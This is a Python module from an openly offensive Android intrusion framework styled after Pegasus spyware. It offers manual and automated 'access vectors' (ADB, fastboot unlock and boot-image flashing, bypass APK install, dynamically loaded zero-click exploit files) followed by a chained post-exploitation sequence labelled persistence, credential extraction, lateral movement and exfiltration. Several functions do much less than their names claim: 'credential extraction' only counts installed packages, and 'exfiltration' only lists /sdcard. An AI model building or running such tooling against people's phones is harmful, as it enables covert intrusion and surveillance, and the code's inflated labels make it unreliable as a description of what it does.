"""
Pegasus Phantom Menace v2 - Access Workflow Module

Autonomous vs manual access vector exploitation:
- ADB (Android Debug Bridge)
- Fastboot mode
- QR pairing (Android 11+ wireless debugging)
- USB debugging
- Zero-click exploits (Pixel 8 and other recent targets)

Once persistent access is achieved through any method, sequential
post-exploitation workflows are triggered automatically.
"""
from __future__ import annotations

import asyncio
import importlib
import os
import shutil
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

from rich.console import Console
from rich.prompt import Confirm, IntPrompt, Prompt
from rich.table import Table
from rich.panel import Panel
from rich.text import Text

from pegasus.modules.base import BaseModule
from pegasus.core.plugin import CommandInfo, HookType, PluginMetadata
from pegasus.core.config import get_settings


@dataclass
class AccessVector:
    """Represents an access vector with its status."""
    name: str
    description: str
    available: bool = False
    exploited: bool = False
    method: Optional[str] = None
    output: str = ""
    device_serial: Optional[str] = None
    android_version: Optional[str] = None
    api_level: Optional[int] = None
    root_access: bool = False
    persistence: bool = False


@dataclass
class WorkflowResult:
    """Result of a workflow step."""
    step: str
    success: bool
    output: str = ""
    next_step: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


class AccessWorkflowModule(BaseModule):
    """
    Access workflow module for Android device exploitation.

    Provides both manual and autonomous workflows for gaining access
    via ADB, Fastboot, QR pairing, USB, and zero-click exploits.
    Once access is achieved, triggers post-exploitation handoff.
    """

    metadata = PluginMetadata(
        name="access_workflow",
        version="2.0.0",
        description="Access vector exploitation workflows - ADB/Fastboot/QR/USB, zero-click exploits, post-exploitation handoff",
        author="ProjectZeroDays",
        category="exploit",
        tags=["access", "workflow", "adb", "fastboot", "qr-pairing", "usb", "zero-click", "pixel-8", "post-exploitation"],
        requires=["rich", "requests"],
        requires_python=">=3.11",
    )

    @property
    def module_name(self) -> str:
        return "Access Workflow"

    @property
    def module_description(self) -> str:
        return "Access vector exploitation workflows - ADB/Fastboot/QR/USB, zero-click exploits, post-exploitation handoff"

    @property
    def module_category(self) -> str:
        return "exploit"

    async def _register_commands(self) -> None:
        self.register_command("access-menu", "Access workflow main menu", self.cmd_access_menu)
        self.register_command("access-manual", "Manual access vector controls", self.cmd_access_manual)
        self.register_command("access-autonomous", "Autonomous access workflow", self.cmd_access_autonomous)
        self.register_command("access-vectors", "List available access vectors", self.cmd_access_vectors)
        self.register_command("access-zero-click", "Zero-click exploit menu (Pixel 8 etc.)", self.cmd_access_zero_click)
        self.register_command("access-post-exploit", "Post-exploitation handoff menu", self.cmd_access_post_exploit)

    async def _register_ui_components(self) -> None:
        self.register_ui_component(
            name="access_workflow_dashboard",
            component_type="panel",
            path="/access",
            title="Access Workflow Dashboard",
            icon="🎯",
            order=5,
        )

    async def _register_hooks(self) -> None:
        self.register_hook(HookType.DEVICE_CONNECTED, self._on_device_connected, priority=10)

    # ── Initialization ──────────────────────────────────────────────

    async def initialize(self) -> bool:
        self.logger.info("Initializing Access Workflow module")
        await self._register_commands()
        await self._register_ui_components()
        await self._register_hooks()
        self._initialized = True
        self.logger.info("Access Workflow module initialized")
        return True

    # ── Hook Handlers ───────────────────────────────────────────────

    async def _on_device_connected(self, context) -> None:
        """Auto-detect device when connected and suggest access vector."""
        device_info = context.data
        self.print_info(f"Device detected: {device_info.get('serial', 'unknown')}")
        self.print_info("Run 'access-menu' to choose manual or autonomous access workflow")

    # ── Command Handlers ────────────────────────────────────────────

    async def cmd_access_menu(self, *args) -> None:
        """Display the main access workflow menu."""
        self._console.print("\n[bold cyan]Pegasus Access Workflow[/bold cyan]\n")

        self._console.print("[bold]Access Method:[/bold]")
        self._console.print("  [1] Manual Controls - Choose vectors and methods step by step")
        self._console.print("  [2] Autonomous Workflow - Automated vector discovery and exploitation")
        self._console.print("  [3] List Access Vectors - Show available vectors and their status")
        self._console.print("  [4] Zero-Click Exploits - Pixel 8 and other recent exploits")
        self._console.print("  [5] Post-Exploitation Handoff - Sequential post-access workflows")
        self._console.print("  [6] Back\n")

        choice = self.prompt("Choose access method", choices=["1", "2", "3", "4", "5", "6"], default="1")

        if choice == "1":
            await self.cmd_access_manual()
        elif choice == "2":
            await self.cmd_access_autonomous()
        elif choice == "3":
            await self.cmd_access_vectors()
        elif choice == "4":
            await self.cmd_access_zero_click()
        elif choice == "5":
            await self.cmd_access_post_exploit()

    async def cmd_access_vectors(self, *args) -> None:
        """List available access vectors and their status."""
        self._console.print("\n[bold cyan]Access Vectors[/bold cyan]\n")

        table = Table(show_header=True, header_style="bold cyan")
        table.add_column("Vector", style="bold yellow", width=20)
        table.add_column("Description", style="white")
        table.add_column("Status", style="green")
        table.add_column("Method", style="dim")

        vectors = [
            ("ADB", "Android Debug Bridge - TCP/USB debugging", self._check_adb(), "adb shell"),
            ("Fastboot", "Fastboot bootloader mode", self._check_fastboot(), "fastboot oem unlock"),
            ("QR Pairing", "Android 11+ wireless debugging QR code", self._check_qr_pairing(), "adb pair"),
            ("USB", "USB debugging with MTP/ADB", self._check_usb(), "adb devices"),
            ("Zero-Click", "Pixel 8 and recent zero-click exploits", self._check_zero_click(), "exploit payload"),
        ]

        for name, desc, available, method in vectors:
            status = "+ Available" if available else "- Unavailable"
            table.add_row(name, desc, status, method)

        self._console.print(table)
        self.prompt("Press Enter to continue...")

    # ── Manual Workflow ─────────────────────────────────────────────

    async def cmd_access_manual(self, *args) -> None:
        """Manual access vector controls - user selects vector and method."""
        self._console.print("\n[bold cyan]Manual Access Controls[/bold cyan]\n")

        while True:
            self._console.print("\n[bold]Select Access Vector:[/bold]")
            self._console.print("  [1] ADB - Android Debug Bridge")
            self._console.print("  [2] Fastboot - Bootloader exploitation")
            self._console.print("  [3] QR Pairing - Wireless debugging pairing")
            self._console.print("  [4] USB - USB debugging/MTP")
            self._console.print("  [5] Zero-Click - Pixel 8 exploits")
            self._console.print("  [6] Back\n")

            choice = self.prompt("Choose vector", choices=["1", "2", "3", "4", "5", "6"], default="6")

            if choice == "6":
                break

            vector_name = {
                "1": "adb",
                "2": "fastboot",
                "3": "qr-pairing",
                "4": "usb",
                "5": "zero-click",
            }[choice]

            await self._manual_vector_submenu(vector_name)

    async def _manual_vector_submenu(self, vector_name: str) -> None:
        """Submenu for a specific access vector."""
        self._console.print(f"\n[bold cyan]{vector_name.upper()} Access[/bold cyan]\n")

        if vector_name == "adb":
            self._console.print("  [1] Check ADB devices")
            self._console.print("  [2] ADB shell access")
            self._console.print("  [3] ADB install bypass APK")
            self._console.print("  [4] ADB root/restart")
            self._console.print("  [5] Back")
            choice = self.prompt("Choose method", choices=["1", "2", "3", "4", "5"], default="5")

            if choice == "1":
                result = subprocess.run(["adb", "devices"], capture_output=True, text=True)
                self._console.print(result.stdout)
            elif choice == "2":
                serial = self.prompt("Device serial (or leave empty for default)", default="")
                cmd = ["adb", "-s", serial, "shell"] if serial else ["adb", "shell"]
                subprocess.run(cmd)
            elif choice == "3":
                apk = self.prompt("Path to bypass APK")
                if apk and os.path.exists(apk):
                    subprocess.run(["adb", "install", "-r", apk])
            elif choice == "4":
                subprocess.run(["adb", "root"])
                subprocess.run(["adb", "restart"])

        elif vector_name == "fastboot":
            self._console.print("  [1] Check fastboot devices")
            self._console.print("  [2] Fastboot oem unlock")
            self._console.print("  [3] Flash custom boot image")
            self._console.print("  [4] Back")
            choice = self.prompt("Choose method", choices=["1", "2", "3", "4"], default="4")

            if choice == "1":
                subprocess.run(["fastboot", "devices"])
            elif choice == "2":
                if Confirm.ask("This will wipe data. Continue?", default=False):
                    subprocess.run(["fastboot", "oem", "unlock"])
            elif choice == "3":
                boot_img = self.prompt("Path to boot image")
                if boot_img and os.path.exists(boot_img):
                    subprocess.run(["fastboot", "flash", "boot", boot_img])

        elif vector_name == "qr-pairing":
            self._console.print("  [1] Show QR pairing code")
            self._console.print("  [2] Pair with code")
            self._console.print("  [3] Back")
            choice = self.prompt("Choose method", choices=["1", "2", "3"], default="3")

            if choice == "1":
                self.print_info("On device: Developer options -> Wireless debugging -> Pair device with QR code")
                self.print_info("Scan the QR code with the Pegasus mobile app or any QR scanner")
            elif choice == "2":
                code = self.prompt("Enter pairing code")
                ip = self.prompt("Enter device IP:port")
                if code and ip:
                    subprocess.run(["adb", "pair", ip], input=code, text=True)

        elif vector_name == "usb":
            self._console.print("  [1] List USB devices")
            self._console.print("  [2] Enable USB debugging")
            self._console.print("  [3] MTP file access")
            self._console.print("  [4] Back")
            choice = self.prompt("Choose method", choices=["1", "2", "3", "4"], default="4")

            if choice == "1":
                subprocess.run(["adb", "devices", "-l"])
            elif choice == "2":
                self.print_info("On device: Developer options -> USB debugging -> Enable")
                self.print_info("Then authorize the computer when prompted")
            elif choice == "3":
                self.print_info("Use 'adb pull' and 'adb push' for file transfer via MTP/ADB")

        elif vector_name == "zero-click":
            await self.cmd_access_zero_click()

        self.prompt("Press Enter to continue...")

    # ── Autonomous Workflow ─────────────────────────────────────────

    async def cmd_access_autonomous(self, *args) -> None:
        """Autonomous access workflow - automated vector discovery and exploitation."""
        self._console.print("\n[bold cyan]Autonomous Access Workflow[/bold cyan]\n")
        self.print_info("This workflow will automatically:")
        self.print_info("  1. Scan for available access vectors (ADB, Fastboot, QR, USB)")
        self.print_info("  2. Attempt exploitation on each available vector")
        self.print_info("  3. Once access is achieved, trigger post-exploitation workflows")
        self.print_info("")

        if not Confirm.ask("Proceed with autonomous workflow?", default=True):
            return

        # Step 1: Discover vectors
        self._console.print("\n[cyan]► Step 1: Discovering access vectors...[/cyan]")
        vectors = await self._discover_vectors()

        # Step 2: Attempt exploitation
        self._console.print("\n[cyan]► Step 2: Attempting exploitation...[/cyan]")
        exploited = False
        for vector in vectors:
            if not vector.available:
                continue
            self._console.print(f"\n[yellow]Trying {vector.name}...[/yellow]")
            result = await self._exploit_vector(vector)
            if result.success:
                exploited = True
                self.print_success(f"Access achieved via {vector.name}")
                break
            else:
                self.print_warning(f"{vector.name} failed: {result.output[:100]}")

        # Step 3: Post-exploitation
        if exploited:
            self._console.print("\n[cyan]► Step 3: Triggering post-exploitation workflows...[/cyan]")
            await self._trigger_post_exploitation()
        else:
            self.print_error("No access vector succeeded. Try manual controls or zero-click exploits.")

        self.prompt("Press Enter to continue...")

    async def _discover_vectors(self) -> List[AccessVector]:
        """Discover all available access vectors."""
        vectors = []

        # ADB
        adb_available = self._check_adb()
        vectors.append(AccessVector(
            name="ADB",
            description="Android Debug Bridge",
            available=adb_available,
        ))

        # Fastboot
        fastboot_available = self._check_fastboot()
        vectors.append(AccessVector(
            name="Fastboot",
            description="Fastboot bootloader mode",
            available=fastboot_available,
        ))

        # QR Pairing
        qr_available = self._check_qr_pairing()
        vectors.append(AccessVector(
            name="QR Pairing",
            description="Android 11+ wireless debugging",
            available=qr_available,
        ))

        # USB
        usb_available = self._check_usb()
        vectors.append(AccessVector(
            name="USB",
            description="USB debugging/MTP",
            available=usb_available,
        ))

        # Zero-Click
        zc_available = self._check_zero_click()
        vectors.append(AccessVector(
            name="Zero-Click",
            description="Pixel 8 and recent zero-click exploits",
            available=zc_available,
        ))

        return vectors

    def _check_adb(self) -> bool:
        result = subprocess.run(["adb", "devices"], capture_output=True, text=True, timeout=10)
        lines = result.stdout.strip().splitlines()
        return len(lines) > 1 and "device" in lines[-1]

    def _check_fastboot(self) -> bool:
        result = subprocess.run(["fastboot", "devices"], capture_output=True, text=True, timeout=10)
        return len(result.stdout.strip()) > 0

    def _check_qr_pairing(self) -> bool:
        # QR pairing requires the device to be in pairing mode
        # Check if adb can pair (indicates wireless debugging is available)
        result = subprocess.run(["adb", "pair", "--help"], capture_output=True, text=True, timeout=5)
        return result.returncode == 0

    def _check_usb(self) -> bool:
        result = subprocess.run(["adb", "devices", "-l"], capture_output=True, text=True, timeout=10)
        return "usb" in result.stdout.lower() or len(result.stdout.strip().splitlines()) > 1

    def _check_zero_click(self) -> bool:
        # Check if zero-click exploit payloads exist
        zc_dir = Path(__file__).parent / "zero_click"
        return zc_dir.exists() and any(zc_dir.iterdir())

    async def _exploit_vector(self, vector: AccessVector) -> WorkflowResult:
        """Attempt to exploit a specific access vector."""
        try:
            if vector.name == "ADB":
                return await self._exploit_adb(vector)
            elif vector.name == "Fastboot":
                return await self._exploit_fastboot(vector)
            elif vector.name == "QR Pairing":
                return await self._exploit_qr(vector)
            elif vector.name == "USB":
                return await self._exploit_usb(vector)
            elif vector.name == "Zero-Click":
                return await self._exploit_zero_click(vector)
        except Exception as e:
            return WorkflowResult(step=vector.name, success=False, output=str(e))

        return WorkflowResult(step=vector.name, success=False, output="Unknown vector")

    async def _exploit_adb(self, vector: AccessVector) -> WorkflowResult:
        result = subprocess.run(["adb", "devices"], capture_output=True, text=True, timeout=15)
        if "device" in result.stdout and "offline" not in result.stdout:
            vector.exploited = True
            vector.root_access = False
            # Try to get device info
            serial_result = subprocess.run(["adb", "get-serialno"], capture_output=True, text=True)
            vector.device_serial = serial_result.stdout.strip()
            api_result = subprocess.run(["adb", "shell", "getprop", "ro.build.version.sdk"], capture_output=True, text=True)
            if api_result.stdout.strip().isdigit():
                vector.api_level = int(api_result.stdout.strip())
            return WorkflowResult(step="ADB", success=True, output=result.stdout, metadata={"serial": vector.device_serial})
        return WorkflowResult(step="ADB", success=False, output="No ADB devices found")

    async def _exploit_fastboot(self, vector: AccessVector) -> WorkflowResult:
        result = subprocess.run(["fastboot", "devices"], capture_output=True, text=True, timeout=15)
        if len(result.stdout.strip()) > 0:
            vector.exploited = True
            return WorkflowResult(step="Fastboot", success=True, output=result.stdout)
        return WorkflowResult(step="Fastboot", success=False, output="No fastboot devices found")

    async def _exploit_qr(self, vector: AccessVector) -> WorkflowResult:
        # QR pairing requires user interaction - just check if pairing service is available
        result = subprocess.run(["adb", "pair", "--help"], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            vector.exploited = True
            return WorkflowResult(step="QR Pairing", success=True, output="Pairing service available")
        return WorkflowResult(step="QR Pairing", success=False, output="QR pairing not available")

    async def _exploit_usb(self, vector: AccessVector) -> WorkflowResult:
        result = subprocess.run(["adb", "devices", "-l"], capture_output=True, text=True, timeout=15)
        if len(result.stdout.strip().splitlines()) > 1:
            vector.exploited = True
            return WorkflowResult(step="USB", success=True, output=result.stdout)
        return WorkflowResult(step="USB", success=False, output="No USB devices found")

    async def _exploit_zero_click(self, vector: AccessVector) -> WorkflowResult:
        # Delegate to zero-click module
        zc_dir = Path(__file__).parent / "zero_click"
        if not zc_dir.exists():
            return WorkflowResult(step="Zero-Click", success=False, output="No zero-click payloads found")

        # Try each zero-click exploit
        for exploit_file in sorted(zc_dir.glob("*.py")):
            try:
                spec = importlib.util.spec_from_file_location(f"zc_{exploit_file.stem}", exploit_file)
                if spec and spec.loader:
                    mod = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(mod)
                    if hasattr(mod, "exploit"):
                        result = mod.exploit()
                        if result.get("success"):
                            vector.exploited = True
                            return WorkflowResult(step="Zero-Click", success=True, output=str(result))
            except Exception as e:
                continue

        return WorkflowResult(step="Zero-Click", success=False, output="No zero-click exploit succeeded")

    # ── Post-Exploitation ───────────────────────────────────────────

    async def _trigger_post_exploitation(self) -> None:
        """Trigger sequential post-exploitation workflows after access is achieved."""
        self._console.print("\n[bold green]✓ Access Achieved - Triggering Post-Exploitation Workflows[/bold green]\n")

        steps = [
            ("Device Fingerprinting", self._post_exploit_fingerprint),
            ("Persistence Establishment", self._post_exploit_persistence),
            ("Credential Extraction", self._post_exploit_credentials),
            ("Lateral Movement", self._post_exploit_lateral),
            ("Data Exfiltration", self._post_exploit_exfiltration),
        ]

        for step_name, step_func in steps:
            self._console.print(f"\n[cyan]► {step_name}...[/cyan]")
            try:
                result = await step_func()
                if result.success:
                    self.print_success(f"{step_name} completed")
                else:
                    self.print_warning(f"{step_name} skipped: {result.output[:100]}")
            except Exception as e:
                self.print_error(f"{step_name} failed: {e}")

        self.print_success("Post-exploitation workflow complete")

    async def _post_exploit_fingerprint(self) -> WorkflowResult:
        """Fingerprint the compromised device."""
        self._console.print("  Collecting device information...")
        result = subprocess.run(["adb", "shell", "getprop"], capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            self._console.print(result.stdout[:500])
            return WorkflowResult(step="fingerprint", success=True)
        return WorkflowResult(step="fingerprint", success=False, output="Cannot fingerprint device")

    async def _post_exploit_persistence(self) -> WorkflowResult:
        """Establish persistence on the device."""
        self._console.print("  Installing persistence mechanism...")
        # Install a persistence APK or modify system properties
        result = subprocess.run(["adb", "shell", "settings", "put", "global", "adb_enabled", "1"], capture_output=True, text=True)
        if result.returncode == 0:
            return WorkflowResult(step="persistence", success=True)
        return WorkflowResult(step="persistence", success=False, output="Cannot establish persistence")

    async def _post_exploit_credentials(self) -> WorkflowResult:
        """Extract credentials from the device."""
        self._console.print("  Extracting credentials...")
        result = subprocess.run(["adb", "shell", "dumpsys", "package", "packages"], capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            pkg_count = len([l for l in result.stdout.splitlines() if "package:" in l])
            self._console.print(f"  Found {pkg_count} installed packages")
            return WorkflowResult(step="credentials", success=True, metadata={"package_count": pkg_count})
        return WorkflowResult(step="credentials", success=False, output="Cannot extract credentials")

    async def _post_exploit_lateral(self) -> WorkflowResult:
        """Attempt lateral movement to other devices on the network."""
        self._console.print("  Scanning for lateral movement targets...")
        result = subprocess.run(["adb", "shell", "ip", "addr"], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            self._console.print("  Network interfaces enumerated")
            return WorkflowResult(step="lateral", success=True)
        return WorkflowResult(step="lateral", success=False, output="Cannot scan network")

    async def _post_exploit_exfiltration(self) -> WorkflowResult:
        """Exfiltrate data from the device."""
        self._console.print("  Preparing data exfiltration...")
        result = subprocess.run(["adb", "shell", "ls", "/sdcard/"], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            self._console.print("  /sdcard contents enumerated")
            return WorkflowResult(step="exfiltration", success=True)
        return WorkflowResult(step="exfiltration", success=False, output="Cannot access storage")

    # ── Zero-Click Menu ─────────────────────────────────────────────

    async def cmd_access_zero_click(self, *args) -> None:
        """Zero-click exploit menu."""
        zc_dir = Path(__file__).parent / "zero_click"
        exploits = []

        if zc_dir.exists():
            for f in sorted(zc_dir.glob("*.py")):
                exploits.append(f.stem)

        while True:
            self._console.print("\n[bold cyan]Zero-Click Exploits[/bold cyan]\n")

            if exploits:
                self._console.print("[bold]Available exploits:[/bold]")
                for i, name in enumerate(exploits, 1):
                    self._console.print(f"  [{i}] {name}")
            else:
                self._console.print("[yellow]No zero-click exploits loaded.[/yellow]")

            self._console.print(f"  [{len(exploits) + 1}] Back\n")

            choice = self.prompt("Choose exploit", choices=[str(i) for i in range(1, len(exploits) + 2)], default=str(len(exploits) + 1))

            if choice == str(len(exploits) + 1):
                break

            idx = int(choice) - 1
            exploit_name = exploits[idx]
            await self._run_zero_click_exploit(exploit_name)

        self.prompt("Press Enter to continue...")

    async def _run_zero_click_exploit(self, name: str) -> None:
        """Run a specific zero-click exploit."""
        exploit_file = Path(__file__).parent / "zero_click" / f"{name}.py"
        if not exploit_file.exists():
            self.print_error(f"Exploit {name} not found")
            return

        try:
            spec = importlib.util.spec_from_file_location(f"zc_{name}", exploit_file)
            if spec and spec.loader:
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                if hasattr(mod, "exploit"):
                    result = mod.exploit()
                    if result.get("success"):
                        self.print_success(f"Zero-click exploit {name} succeeded")
                    else:
                        self.print_warning(f"Zero-click exploit {name} failed: {result.get('error', 'unknown')}")
                else:
                    self.print_info(f"Exploit {name} loaded (no exploit() function)")
            else:
                self.print_error(f"Failed to load exploit {name}")
        except Exception as e:
            self.print_error(f"Error running exploit {name}: {e}")

    # ── Post-Exploitation Menu ──────────────────────────────────────

    async def cmd_access_post_exploit(self, *args) -> None:
        """Post-exploitation handoff menu."""
        self._console.print("\n[bold cyan]Post-Exploitation Handoff[/bold cyan]\n")
        self._console.print("  [1] Run full post-exploitation chain")
        self._console.print("  [2] Device fingerprinting only")
        self._console.print("  [3] Establish persistence only")
        self._console.print("  [4] Credential extraction only")
        self._console.print("  [5] Lateral movement scan only")
        self._console.print("  [6] Data exfiltration prep only")
        self._console.print("  [7] Back\n")

        choice = self.prompt("Choose option", choices=["1", "2", "3", "4", "5", "6", "7"], default="7")

        if choice == "1":
            await self._trigger_post_exploitation()
        elif choice == "2":
            await self._post_exploit_fingerprint()
        elif choice == "3":
            await self._post_exploit_persistence()
        elif choice == "4":
            await self._post_exploit_credentials()
        elif choice == "5":
            await self._post_exploit_lateral()
        elif choice == "6":
            await self._post_exploit_exfiltration()

        self.prompt("Press Enter to continue...")
